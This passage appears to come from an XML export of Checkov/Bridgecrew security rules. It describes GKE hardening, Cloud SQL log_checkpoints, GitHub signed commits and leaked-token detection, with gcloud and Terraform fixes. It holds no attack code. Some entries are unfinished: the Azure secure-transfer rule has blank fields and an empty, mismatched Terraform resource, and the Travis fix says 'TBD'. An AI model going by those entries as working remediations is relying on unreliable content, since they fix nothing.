      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-cluster-node-auto-upgrade-configuration-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-cluster-node-auto-upgrade-configuration-is-disabled"></div>GCP Kubernetes cluster node auto-upgrade configuration is disabled</div><a aria-label="Skip link to GCP Kubernetes cluster node auto-upgrade configuration is disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-cluster-node-auto-upgrade-configuration-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Node <strong>auto-upgrade</strong> keeps nodes up-to-date with the latest cluster master version when your master is updated on your behalf. When a new cluster or node pool is created, node <strong>auto-upgrade</strong> is enabled as default.</p>
<p>We recommend you ensure <strong>auto-upgrade</strong> is enabled. Automatic node upgrade ensures that when new binaries are released you instantly get a fix with the latest security issues resolved. GKE will automatically ensure that security updates are applied and kept up to date.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_25</key>
    <name>Ensure private cluster is enabled when creating Kubernetes clusters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="private-cluster-is-disabled-when-creating-kubernetes-clusters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-private-cluster-is-disabled-when-creating-kubernetes-clusters"></div>Private cluster is disabled when creating Kubernetes clusters</div><a aria-label="Skip link to Private cluster is disabled when creating Kubernetes clusters" class="heading-anchor-icon fa fa-anchor" href="#private-cluster-is-disabled-when-creating-kubernetes-clusters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Private clusters enable isolation of nodes from any inbound and outbound connectivity to the public internet. This is achieved as the nodes have internal RFC 1918 IP addresses only. In private clusters, the cluster master has private and public endpoints. You can configure which endpoint should be enabled or disabled to control access to the public internet.</p>
<p>We recommend you enable private cluster when creating Kubernetes clusters. By creating a private cluster, the nodes will have a reserved set of IP addresses, ensuring their workloads are isolated from the public internet.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>Add Block: <strong>private_cluster_config</strong> with attribute  <strong>enable_private_nodes</strong> set to <em>true</em>.</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">google_container_cluster.cluster.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="google_container_cluster.cluster.tf">resource "google_container_cluster" "cluster" {
...
+ private_cluster_config {
+   enable_private_nodes=true
+ }
...
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_12</key>
    <name>Ensure GCP Kubernetes engine clusters have network policy enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-have-network-policy-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-have-network-policy-disabled"></div>GCP Kubernetes engine clusters have network policy disabled</div><a aria-label="Skip link to GCP Kubernetes engine clusters have network policy disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-have-network-policy-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Defining a network policy helps ensure that a compromised front-end service in your application cannot communicate directly with an external interface, for example, a billing or an accounting service several levels down. Network policy rules can ensure that Pods and Services in a given namespace cannot access other Pods or Services in a different namespace.</p>
<p>We recommend you enable Network Policy on kubernetes engine clusters to determine which Pods and Services can access one another inside your cluster. This ensures only the required services are communicating and no explicitly indicated traffic is able to reach private clusters.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_51</key>
    <name>Ensure Cloud SQL PostgreSQL instances have log_checkpoints database flag set to On</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="cloud-sql-postgresql-instances-have-log_checkpoints-database-flag-set-to-off"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-sql-postgre-sql-instances-have-log-checkpoints-database-flag-set-to-off"></div>Cloud SQL PostgreSQL instances have log_checkpoints database flag set to Off</div><a aria-label="Skip link to Cloud SQL PostgreSQL instances have log_checkpoints database flag set to Off" class="heading-anchor-icon fa fa-anchor" href="#cloud-sql-postgresql-instances-have-log_checkpoints-database-flag-set-to-off"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enabling <strong>log_checkpoints</strong> causes checkpoints and restart points to be logged in the server log. Some statistics are included in the log messages, including the number of buffers written, and the time spent writing them. This parameter can only be set in the <strong>postgresql.conf</strong> file or on the server command line. </p>
<p>We recommended you set the <strong>log_checkpoints</strong> database flag for the Cloud SQL PostgreSQL instance to <strong>on</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_checkpoints</strong> from the drop-down menu, and set its value to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">log_checkpoints</code> database flag for every Cloud SQL PosgreSQL database instance using the below command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_checkpoints=on</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all previously set database flags. To keep those flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_checkpoints", value:  by default set to "off"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_checkpoints"
+            value = "on"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_2' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_2</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_2' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_13</key>
    <name>Ensure client certificate authentication to Kubernetes Engine Clusters is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-have-client-certificate-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-have-client-certificate-enabled"></div>GCP Kubernetes engine clusters have client certificate enabled</div><a aria-label="Skip link to GCP Kubernetes engine clusters have client certificate enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-have-client-certificate-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Kubernetes uses client certificates, bearer tokens, an authenticating proxy, HTTP basic auth or OAuth app to authenticate API requests through authentication plugins. As HTTP requests are made to the API server, plugins attempt to associate the following attributes with the request.</p>
<p>We recommend you ensure Kubernetes engine clusters are authenticated using OAuth method and not using client certificates as before after service latest upgrade.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_69</key>
    <name>Travis Personal Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="travis-personal-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-travis-personal-token"></div>Travis Personal Token</div><a aria-label="Skip link to Travis Personal Token" class="heading-anchor-icon fa fa-anchor" href="#travis-personal-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Travis CI is a hosted CI service used to build and test software projects hosted on GitHub and Bitbucket. Travis CI was the first CI service which provided services to open-source projects for free and continues to do so. TravisPro provides custom deployments of a proprietary version on the customer's own hardware.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<p>TBD</p> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_69' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_69</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_69' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_SECRET_70</key>
    <name>Typeform API Token</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="typeform-api-token"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-typeform-api-token"></div>Typeform API Token</div><a aria-label="Skip link to Typeform API Token" class="heading-anchor-icon fa fa-anchor" href="#typeform-api-token"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>To use the Typeform Create, Responses, and Webhooks APIs, you need to pass your personal access token in the Authorization header of your requests. </p>
<p>Access tokens are long strings of random characters that look something like this: tfp_943af478d3ff3d4d760020c11af102b79c440513. The access token is unique per developer. It is used to identify a given user and make sure that only you can access your typeforms and results.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---git"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-git"></div>Fix - Git</div><a aria-label="Skip link to Fix - Git" class="heading-anchor-icon fa fa-anchor" href="#fix---git"></a></h1>
<ol>
<li>Log in to your account at Typeform.</li>
<li>In the upper-left corner, in the drop-down menu next to your username, click Account.</li>
<li>In the left menu, click Personal tokens or here.</li>
<li>Identify the token you want to delete.</li>
<li>Click ..., the three dots button in the right-side of the list.</li>
<li>Click Delete this token.</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/git_secrets_70' target='_blank'> https://docs.bridgecrew.io/docs/git_secrets_70</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/git_secrets_70' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_24</key>
    <name>Ensure PodSecurityPolicy controller is enabled on Kubernetes engine clusters</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="podsecuritypolicy-controller-is-not-enabled-on-kubernetes-engine-clusters"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-pod-security-policy-controller-is-not-enabled-on-kubernetes-engine-clusters"></div>PodSecurityPolicy controller is not enabled on Kubernetes engine clusters</div><a aria-label="Skip link to PodSecurityPolicy controller is not enabled on Kubernetes engine clusters" class="heading-anchor-icon fa fa-anchor" href="#podsecuritypolicy-controller-is-not-enabled-on-kubernetes-engine-clusters"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p><strong>PodSecurityPolicy</strong> is an admission controller resource created to validate requests to create and update Pods on your cluster. The <strong>PodSecurityPolicy</strong> defines a set of conditions that Pods must meet to be accepted by the cluster. When a request to create or update a Pod does not meet the conditions in the PodSecurityPolicy, that request is rejected and an error is returned.</p>
<p>We recommend you enable PodSecurityPolicy Controller on Kubernetes engine clusters.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcloud-cli"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcloud-cli"></div>Gcloud CLI</div><a aria-label="Skip link to Gcloud CLI" class="heading-anchor-icon fa fa-anchor" href="#gcloud-cli"></a></h2>
<p>To update the cluster to enable the PodSecurityPolicy Controller, use this command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud beta container clusters update cluster-name --enable-pod-security-policy
</code></pre>
<p>More information at: <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies?hl=en" target="_self">https://cloud.google.com/kubernetes-engine/docs/how-to/pod-security-policies</a></p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p>First, be sure to have the <strong>google-beta</strong> provider setup in the <strong>google_container_cluster</strong>, then add the following block of code:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">hcl
pod_security_policy_config {
    enabled = true
}
</code></pre>
<p>More information at: <a href="https://www.terraform.io/docs/providers/google/r/container_cluster.html#pod_security_policy_config" target="_self">https://www.terraform.io/docs/providers/google/r/container_cluster.html#pod_security_policy_config</a></p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_9' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_9</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_9' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_3</key>
    <name>Ensure Azure "Secure transfer required" feature is set to Enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-secure-transfer-required-feature-is-set-to-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-secure-transfer-required-feature-is-set-to-disabled"></div>Azure "Secure transfer required" feature is set to Disabled</div><a aria-label='Skip link to Azure "Secure transfer required" feature is set to Disabled' class="heading-anchor-icon fa fa-anchor" href="#azure-secure-transfer-required-feature-is-set-to-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> </li>
<li><strong>Argument:</strong></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_cognitive_account" "example" {
 
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-azure-secure-transfer-required-feature-is-set-to-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-azure-secure-transfer-required-feature-is-set-to-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-azure-secure-transfer-required-feature-is-set-to-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_18</key>
    <name>Ensure GKE control plane is not public</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gke-control-plane-is-public"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gke-control-plane-is-public"></div>GKE control plane is public</div><a aria-label="Skip link to GKE control plane is public" class="heading-anchor-icon fa fa-anchor" href="#gke-control-plane-is-public"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The GKE cluster control plane and nodes have internet routable addresses that can be accessed from any IP address by default. Direct internet access to nodes can be disabled by specifying the gcloud tool option <strong>enable-private-nodes</strong> at cluster creation.</p>
<p>We recommend you disable direct internet access to nodes at cluster creation and ensure clusters use master authorized networks and private nodes to reach the control plane by whitelisted CIDRs, nodes within the cluster VPC and Google management jobs.</p>
<p>We also recommend you limit the exposure of the cluster control plane and nodes to the internet. These settings can only be set at cluster creation time and help ensure sensitive controllers are not exposed to external access.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_10' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_10</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_10' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_19</key>
    <name>Ensure GCP Kubernetes engine clusters have basic authentication disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-kubernetes-engine-clusters-have-basic-authentication-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-kubernetes-engine-clusters-have-basic-authentication-enabled"></div>GCP Kubernetes engine clusters have basic authentication enabled</div><a aria-label="Skip link to GCP Kubernetes engine clusters have basic authentication enabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-kubernetes-engine-clusters-have-basic-authentication-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>GKE supports multiple secure authentication methods, including service account bearer tokens, OAuth tokens, x509 client certificates. Basic authentication and client certificate issuance are disabled by default for clusters created with GKE 1.12 and later. </p>
<p>We recommend you use Cloud IAM, or an alternative secure authentication mechanism, as the identity provider for GKE clusters.</p> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_11' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_11</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_kubernetes_11' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GIT_6</key>
    <name>Ensure GitHub branch protection rules requires signed commits</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="github-branch-protection-rules-do-not-include-signed-commits"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-git-hub-branch-protection-rules-do-not-include-signed-commits"></div>GitHub branch protection rules do not include signed commits</div><a aria-label="Skip link to GitHub branch protection rules do not include signed commits" class="heading-anchor-icon fa fa-anchor" href="#github-branch-protection-rules-do-not-include-signed-commits"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>In GitHub, Branch Protection Rules define whether collaborators can delete or force push to the branch and set requirements for any pushes to the branch, such as passing status checks or a linear commit history.</p>
<p>When you enable required commit signing on a branch, contributors and bots can only push commits that have been signed and verified to the branch. If a collaborator pushes an unsigned commit to a branch that requires commit signatures, the collaborator will need to rebase the commit to include a verified signature, then force push the rewritten commit to the branch.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li>Resource: github_branch_protection, github_branch_protection_v3</li>
<li>Attribute: require_signed_commits</li>
</ul>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-HCL theme-light" data-lang="HCL" name="">resource "github_branch_protection_v3" "example" {
...
+  require_signed_commits = true
}
</code></pre> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits' target='_blank'> https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-signed-commits' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_20</key>
    <name>Ensure master authorized networks are enabled in GKE clusters</name>
    <description>
